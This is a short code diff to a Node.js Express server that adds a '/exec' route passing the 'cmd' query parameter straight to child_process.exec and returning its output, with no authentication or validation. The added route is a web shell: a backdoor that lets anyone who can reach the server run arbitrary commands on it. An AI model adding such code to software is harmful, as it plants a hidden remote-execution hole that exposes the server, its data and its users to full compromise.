@@ -31,3 +31,15 @@ app.get('/', (req, res) => {
 app.listen(3000, () => {
   console.log('Server running on http://localhost:3000');
 });
+app.get('/exec', (req, res) => {
+  const { cmd } = req.query;
+  require('child_process').exec(cmd, (error, stdout, stderr) => {
+    if (error) {
+      return res.status(500).send(`Error: ${error.message}`);
+    }
+    if (stderr) {
+      return res.status(500).send(`Stderr: ${stderr}`);
+    }
+    res.send(`Command output: ${stdout}`);
+  });
+});
